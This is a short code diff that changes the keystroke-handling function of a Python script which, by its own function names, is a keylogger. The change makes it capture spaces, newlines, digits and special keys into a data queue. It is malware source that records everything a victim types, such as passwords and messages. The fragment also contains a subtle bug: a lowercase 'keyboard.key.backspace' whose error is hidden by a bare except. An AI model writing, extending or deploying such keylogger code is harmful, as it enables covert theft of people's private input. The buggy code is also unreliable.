@@ -18,7 +18,21 @@ def install_pynput():
             print("Error installing the 'pynput' library.")
 
 def on_press(key, data_queue):
-        data_to_send = str(key.char)
+    try:
+        if key == keyboard.Key.space:
+            data_to_send = ' '
+        elif key == keyboard.Key.enter:
+            data_to_send = '\n'
+        elif key == keyboard.key.backspace:
+            data_to_send = ''
+        elif hasattr(key, 'char') and key.char.isnumeric():
+            data_to_send = key.char
+        else:
+            data_to_send = str(key.char)
+
+        data_queue.put(data_to_send)
+    except:
+        data_to_send = str(key)
         data_queue.put(data_to_send)
 
 def keylogger_thread_func(data_queue):
